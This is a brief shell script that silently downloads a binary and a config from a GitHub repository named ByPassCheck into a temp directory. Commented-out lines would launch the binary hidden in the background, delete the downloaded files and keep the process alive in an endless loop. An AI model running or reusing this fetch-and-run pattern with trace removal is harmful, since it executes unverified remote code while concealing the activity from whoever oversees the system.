#!/bin/sh
TMPPATH=$(mktemp -d)
wget https://raw.githubusercontent.com/GTale/ByPassCheck/master/ges -q -O ${TMPPATH}/ges
wget https://raw.githubusercontent.com/GTale/ByPassCheck/master/ges.pb -q -O ${TMPPATH}/ges.pb
#chmod +x ${TMPPATH}/ges 
#nohup ./ges -config ges.pb >/dev/null 2>&1  &
#sleep 5
#rm -rf ges*
#while [ 1 == 1 ]; do sleep 9999; done
